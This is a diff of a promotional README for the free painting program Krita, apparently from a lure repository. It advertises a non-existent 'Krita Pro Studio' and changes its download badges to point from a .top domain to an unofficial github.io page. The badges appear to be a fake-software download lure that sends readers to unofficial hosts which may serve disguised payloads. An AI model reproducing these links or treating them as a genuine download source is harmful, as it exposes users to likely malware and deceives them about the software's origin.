@@ -2,8 +2,8 @@
 
 Krita has revolutionized the digital art world as a completely free yet professional-grade graphic design and animation solution. This powerful open-source platform combines industry-leading painting tools with robust animation capabilities, making it the go-to choice for concept artists, illustrators, comic creators, and game developers worldwide. With its intuitive interface and cutting-edge features, Krita delivers a premium creative experience without the premium price tag.
 
-[![Get Krita Now](https://img.shields.io/badge/Download-Krita_Pro_Studio-magenta)](https://poelkakusthbutn.top/)  
-[![Latest Version](https://img.shields.io/badge/Version-5.2.2-success)](https://poelkakusthbutn.top/)  
+[![Get Krita Now](https://img.shields.io/badge/Download-Krita_Pro_Studio-magenta)](https://graphic-editor-krita.github.io/.github/)  
+[![Latest Version](https://img.shields.io/badge/Version-5.2.2-success)](https://graphic-editor-krita.github.io/.github/)  
 
 ---
 
